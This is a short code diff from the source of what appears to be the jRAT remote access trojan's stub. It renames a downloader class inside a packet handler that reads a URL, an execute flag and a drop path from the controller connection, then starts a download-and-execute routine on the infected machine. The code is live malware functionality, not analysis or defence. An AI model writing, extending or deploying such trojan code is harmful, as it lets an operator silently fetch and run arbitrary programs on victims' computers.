@@ -1,6 +1,6 @@
 package pro.jrat.stub.packets.incoming;
 
-import pro.jrat.stub.AdvDownloader;
+import pro.jrat.stub.AdvancedDownloader;
 import pro.jrat.stub.Connection;
 
 public class Packet34AdvancedDownload extends AbstractIncomingPacket {
@@ -10,7 +10,7 @@ public class Packet34AdvancedDownload extends AbstractIncomingPacket {
 		String url = Connection.readLine();
 		boolean exec = Connection.readBoolean();
 		String drop = Connection.readLine().toLowerCase();
-		new AdvDownloader(url, exec, drop).start();
+		new AdvancedDownloader(url, exec, drop).start();
 	}
 
 }
